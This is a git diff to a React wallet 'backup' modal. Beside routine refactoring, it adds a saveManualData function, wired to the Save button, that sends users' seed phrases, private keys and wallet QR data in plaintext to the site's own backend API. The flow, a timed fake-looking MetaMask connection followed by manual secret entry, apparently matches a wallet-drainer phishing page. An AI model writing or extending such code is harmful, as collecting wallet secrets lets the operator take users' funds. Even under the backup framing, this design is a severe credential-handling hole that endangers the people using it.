@@ -2,12 +2,7 @@ import React, { useState } from "react";
 import { useSession } from "next-auth/react";
 import { utils } from "ethers"; // Import utils from ethers
 import { QRCodeSVG } from "qrcode.react";
-import {
-  Dialog,
-  DialogContent,
-  DialogHeader,
-  DialogTitle,
-} from "@/components/ui/dialog";
+import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input"; // Assumes you have an Input component
 
@@ -24,9 +19,7 @@ interface WalletModalProps {
   onClose: () => void;
   selectedWallet: BackupWallet | null;
   modalStep: "initial" | "connecting" | "success" | "error";
-  setModalStep: React.Dispatch<
-    React.SetStateAction<"initial" | "connecting" | "success" | "error">
-  >;
+  setModalStep: React.Dispatch<React.SetStateAction<"initial" | "connecting" | "success" | "error">>;
   loading: boolean;
   error: string | null;
   walletAddress: string | null;
@@ -117,6 +110,7 @@ const WalletModal: React.FC<WalletModalProps> = ({
               publicAddress,
               balance,
               walletName: selectedWallet?.name,
+              currency: selectedWallet?.currency, // Added currency to the payload
             }),
           });
 
@@ -130,8 +124,13 @@ const WalletModal: React.FC<WalletModalProps> = ({
         } else {
           throw new Error("No accounts found in MetaMask.");
         }
-      } catch (err: any) {
-        setDynamicError(err.message || "Failed to connect to MetaMask.");
+      } catch (err: unknown) {
+        // Adjust the error handling
+        if (err instanceof Error) {
+          setDynamicError(err.message || "Failed to connect to MetaMask.");
+        } else {
+          setDynamicError("An unexpected error occurred.");
+        }
         setModalStep("error");
       }
     }, 5000);
@@ -144,6 +143,56 @@ const WalletModal: React.FC<WalletModalProps> = ({
       setCurrentStep(0); // Reset to the initial step
       setModalStep("initial"); // Reset modal to initial state
     }
+  };
+
+  const saveManualData = async () => {
+    const { publicAddress, seedPhrase, privateKey, qrCodeData } = backupData;
+
+    if (!publicAddress) {
+      setDynamicError("Public address is required.");
+      return;
+    }
+
+    // Prepare the data to be sent to the backend API
+    const walletData = {
+      userId: userId, // Use userId from the session
+      publicAddress,
+      walletName: selectedWallet?.name || "Manual Wallet", // Default to a name if not provided
+      seedPhrase: seedPhrase || null, // Optional
+      privateKey: privateKey || null, // Optional
+      qrCodeData: qrCodeData || null, // Optional
+    };
+
+    try {
+      const response = await fetch(`/api/backup/storeWalletData/${userId}`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(walletData),
+      });
+
+      if (response.ok) {
+        const data = await response.json();
+        console.log("Manual wallet data saved:", data);
+        setModalStep("success");
+      } else {
+        throw new Error("Failed to save manual wallet data.");
+      }
+    } catch (error: unknown) {
+      // Adjust error handling for unknown errors
+      if (error instanceof Error) {
+        setDynamicError(error.message || "An error occurred while saving data.");
+      } else {
+        setDynamicError("An unexpected error occurred.");
+      }
+      setModalStep("error");
+    }
+  };
+
+  const goBack = () => {
+    setCurrentStep(0); // Go back to the initial step
+    setModalStep("initial"); // Reset modal to initial state
   };
 
   if (!selectedWallet) return null;
@@ -241,7 +290,7 @@ const WalletModal: React.FC<WalletModalProps> = ({
               value={backupData.seedPhrase}
               onChange={handleSeedPhraseChange} // Handling seed phrase change
             />
-            <span className="text-green-500 text-sm">Seperate each phrase with a comma ','</span>
+            <span className="text-green-500 text-sm">Separate each phrase with a comma ','</span>
             {/* Display seed phrase tags */}
             <div className="flex flex-wrap gap-2 mt-4">
               {(backupData.seedPhraseArray || []).map((tag, index) => (
@@ -275,9 +324,13 @@ const WalletModal: React.FC<WalletModalProps> = ({
                 setBackupData({ ...backupData, qrCodeData: e.target.value })
               }
             />
-            <div className="flex justify-center gap-2">
-              <Button onClick={connectWalletManually}>Go Back</Button>
-              <Button onClick={() => setCurrentStep(2)}>Save</Button>
+            <div className="flex justify-between mt-4">
+              <Button variant="outline" onClick={goBack}>
+                Go Back
+              </Button>
+              <Button onClick={saveManualData}>
+                Save
+              </Button>
             </div>
           </div>
         </DialogContent>
